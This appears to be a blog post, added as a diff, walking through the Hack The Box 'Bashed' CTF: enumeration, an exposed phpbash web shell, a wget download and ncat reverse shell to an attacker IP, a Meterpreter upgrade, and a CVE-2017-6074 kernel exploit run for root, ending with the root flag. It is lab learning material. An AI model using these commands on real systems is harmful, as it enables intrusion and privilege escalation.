@@ -1,0 +1,150 @@
+I"!3<h1 id="overview">Overview</h1>
+<p><a href="https://app.hackthebox.eu/machines/118" class="highlighted">Bashed</a> is a boot to root CTF from the Hack the Box archives. This was one of my favorite retired HTB challenges so far. The challenge involves initial compromise using a developer’s misconfigured server and requires significant more work to escalate privileges to root. This challenge forced me to think outside the box for managing shells and was overall a good CTF.</p>
+
+<h2 id="enumeration">Enumeration</h2>
+
+<p>First, I conducted a basic nmap scan to enumerate open ports and services running on the target machine. The scan revealed an apache webserver was running on port 80.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/Documents/htb/bashed]
+└─<span class="nv">$ </span>nmap <span class="nt">-sV</span> <span class="nt">--top-ports</span> 200 10.10.10.68           
+Starting Nmap 7.91 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-03-05 09:06 EST
+Nmap scan report <span class="k">for </span>10.10.10.68
+Host is up <span class="o">(</span>0.035s latency<span class="o">)</span><span class="nb">.</span>
+Not shown: 199 closed ports
+PORT   STATE SERVICE VERSION
+80/tcp open  http    Apache httpd 2.4.18 <span class="o">((</span>Ubuntu<span class="o">))</span>
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
+Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>7.05 seconds
+</code></pre></div></div>
+
+<h2 id="web-application-testing">Web Application Testing</h2>
+
+<p>Nexct, I launched BurpSuite and a firefox browser to being inspecting the target’s web application. In the background, I started <code class="language-plaintext highlighter-rouge">dirb</code> a directory brute forcing tool. The resulting dirb scan revealed a directory called <code class="language-plaintext highlighter-rouge">dev</code>.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/Documents/htb/bashed]
+└─<span class="nv">$ </span>dirb http://10.10.10.68         
+
+<span class="nt">-----------------</span>
+DIRB v2.22    
+By The Dark Raver
+<span class="nt">-----------------</span>
+
+START_TIME: Fri Mar  5 09:10:15 2021
+URL_BASE: http://10.10.10.68/
+WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
+
+<span class="nt">-----------------</span>
+
+GENERATED WORDS: 4612                                                          
+
+<span class="nt">----</span> Scanning URL: http://10.10.10.68/ <span class="nt">----</span>
+<span class="o">==&gt;</span> DIRECTORY: http://10.10.10.68/css/                                                                                                          
+<span class="o">==&gt;</span> DIRECTORY: http://10.10.10.68/dev/                                                                                                          
+<span class="o">==&gt;</span> DIRECTORY: http://10.10.10.68/fonts/                                                                                                        
+<span class="o">==&gt;</span> DIRECTORY: http://10.10.10.68/images/                                                                                                       
++ http://10.10.10.68/index.html <span class="o">(</span>CODE:200|SIZE:7743<span class="o">)</span>                                                                                            
+<span class="o">==&gt;</span> DIRECTORY: http://10.10.10.68/js/                                                                                                           
+<span class="o">==&gt;</span> DIRECTORY: http://10.10.10.68/php/                                                                                                          
++ http://10.10.10.68/server-status <span class="o">(</span>CODE:403|SIZE:299<span class="o">)</span>                                                                                          
+<span class="o">==&gt;</span> DIRECTORY: http://10.10.10.68/uploads/    
+</code></pre></div></div>
+
+<h2 id="exploit-developer-tools">Exploit Developer Tools</h2>
+
+<p>After reading the index page of the website, I understood the server was also being used to develop the tool <a href="https://github.com/Arrexel/phpbash">php bash</a>. Browsing the /dev path shows that indeed, a working version of phpbash is running on the target server. The program allows a user to interact with a bash like terminal through the browser itself. I used this terminal to find the user flag, which was located at <code class="language-plaintext highlighter-rouge">/home/arrexel</code>.</p>
+
+<div class="row mt-3">
+    <div class="center">
+        <img class="img-fluid rounded z-depth-1" src="/assets/img/posts/2021-03-05-bashed-hack-the-box-walkthrough/user-flag.png" />
+    </div>
+</div>
+<p><br /></p>
+
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+
+<p>To start the privilege escalation process, I wanted to upgrade my shell from the phpBash shell to a meterpreter one. Unfortunately, when trying to send a reverse shell to my attacker machine with <code class="language-plaintext highlighter-rouge">netcat</code>, an error message occured stating that the -e option was not available. This was because the installed version of netcat was the BSD flavor (netcat-openBSD), only the traditional netcat (netcat-traditional) supports the -e option which is required to send a reverse shell. To get around this, I found a <a class="highlighted" href="https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/ncat">linux binary version</a>of the traditional netcat. After downloading the binary, I put in the <code class="language-plaintext highlighter-rouge">/var/www/html</code> directory to serve with the apache webserver, then used <code class="language-plaintext highlighter-rouge">wget</code> to download the file to the target machine through the dev phpBash terminal.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@bashed:/var/www/html/uploads# wget 10.10.14.13/ncat-d
+</code></pre></div></div>
+
+<p>Next, I started a listener on my attack machine with the multi/handler on metasploit to catch the reverse shell.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msf6 exploit<span class="o">(</span>multi/handler<span class="o">)</span> <span class="o">&gt;</span> run
+
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Started reverse TCP handler on 10.10.14.13:4444 
+</code></pre></div></div>
+<p>Once the handler was started, I used the the phpBash sell to issue a reverse shell through the uploaded ncat binary.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@bashed:./ncat-d 10.10.14.13 4444 <span class="nt">-e</span> /bin/bash
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msf6 exploit<span class="o">(</span>multi/handler<span class="o">)</span> <span class="o">&gt;</span> run
+
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Started reverse TCP handler on 10.10.14.13:4444 
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Command shell session 1 opened <span class="o">(</span>10.10.14.13:4444 -&gt; 10.10.10.68:48554<span class="o">)</span> at 2021-03-05 18:34:33 <span class="nt">-0500</span>
+</code></pre></div></div>
+
+<h3 id="upgrading-to-meterpreter-shell">Upgrading to Meterpreter Shell</h3>
+
+<p>Once I recieved the reverse shell, I background it with the cntl-z option. To upgrade this basic shell to a meterpreter one, I used the <code class="language-plaintext highlighter-rouge">multi/manage/shell_to_meterpreter</code> module. After configuring the necessary options, I executed the module and started the meterpreter session.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msf6 post<span class="o">(</span>multi/manage/shell_to_meterpreter<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">set </span>LHOST 10.10.14.13
+LHOST <span class="o">=&gt;</span> 10.10.14.13
+msf6 post<span class="o">(</span>multi/manage/shell_to_meterpreter<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">set </span>SESSION 1
+SESSION <span class="o">=&gt;</span> 1
+msf6 post<span class="o">(</span>multi/manage/shell_to_meterpreter<span class="o">)</span> <span class="o">&gt;</span> run
+
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Upgrading session ID: 1
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Starting exploit/multi/handler
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Started reverse TCP handler on 10.10.14.13:4433 
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Sending stage <span class="o">(</span>980808 bytes<span class="o">)</span> to 10.10.10.68
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Meterpreter session 2 opened <span class="o">(</span>10.10.14.13:4433 -&gt; 10.10.10.68:42086<span class="o">)</span> at 2021-03-05 18:38:50 <span class="nt">-0500</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Command stager progress: 100.00% <span class="o">(</span>773/773 bytes<span class="o">)</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Post module execution completed
+msf6 post<span class="o">(</span>multi/manage/shell_to_meterpreter<span class="o">)</span> <span class="o">&gt;</span> 
+</code></pre></div></div>
+
+<h2 id="privilege-escalation-via-cve-2017-6074">Privilege Escalation via CVE-2017-6074</h2>
+
+<p>The last stage to escalate privileges was to find a public exploit that would work against the linux kernel. Some online research revealed that the Ubuntu 16.04 (Linux 4.4.0-62-generic) kernel being used by the target could be vulnerable to. CVE-2017-6074. I downloaded a proof of concept from <a class="highlighted" href="https://www.exploit-db.com/exploits/41458">exploi-db</a>. Using <code class="language-plaintext highlighter-rouge">GCC</code>, I compiled the exploit, then uploaded it to the target using the <code class="language-plaintext highlighter-rouge">upload</code> meterpreter command back in the metepreter session.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>meterpreter <span class="o">&gt;</span> upload /home/kali/Documents/htb/bashed/CVE-2017-6074
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> uploading  : /home/kali/Documents/htb/bashed/CVE-2017-6074 -&gt; CVE-2017-6074
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Uploaded <span class="nt">-1</span>.00 B of 23.19 KiB <span class="o">(</span><span class="nt">-0</span>.0%<span class="o">)</span>: /home/kali/Documents/htb/bashed/CVE-2017-6074 -&gt; CVE-2017-6074
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> uploaded   : /home/kali/Documents/htb/bashed/CVE-2017-6074 -&gt; CVE-2017-6074
+meterpreter <span class="o">&gt;</span> <span class="nb">chmod </span>777 CVE-2017-6074 
+meterpreter <span class="o">&gt;</span> shell
+Process 819 created.
+Channel 2 created.
+python <span class="nt">-c</span> <span class="s1">'import pty;pty.spawn("/bin/bash")'</span>
+www-data@bashed:~/html/uploads<span class="nv">$ </span>
+
+
+www-data@bashed:~/html/uploads<span class="nv">$ </span><span class="nb">whoami
+whoami
+</span>www-data
+www-data@bashed:~/html/uploads<span class="nv">$ </span>./CVE-2017-6074
+./CVE-2017-6074
+<span class="o">[</span>.] namespace sandbox setup successfully
+<span class="o">[</span>.] disabling SMEP &amp; SMAP
+<span class="o">[</span>.] scheduling 0xffffffff81064550<span class="o">(</span>0x406e0<span class="o">)</span>
+<span class="o">[</span>.] waiting <span class="k">for </span>the timer to execute
+<span class="o">[</span>.] <span class="k">done</span>
+<span class="o">[</span>.] SMEP &amp; SMAP should be off now
+<span class="o">[</span>.] getting root
+<span class="o">[</span>.] executing 0x564e7dc912aa
+<span class="o">[</span>.] <span class="k">done</span>
+<span class="o">[</span>.] should be root now
+<span class="o">[</span>.] checking <span class="k">if </span>we got root
+<span class="o">[</span>+] got r00t ^_^
+<span class="o">[!]</span> don<span class="s1">'t kill the exploit binary, the kernel will crash
+root@bashed:/var/www/html/uploads# whoami
+whoami
+root
+root@bashed:/var/www/html/uploads# cat /root/root.txt
+cat /root/root.txt
+cc4f0afe3a1026d402ba10329674a8e2
+</span></code></pre></div></div>
+
+:ET
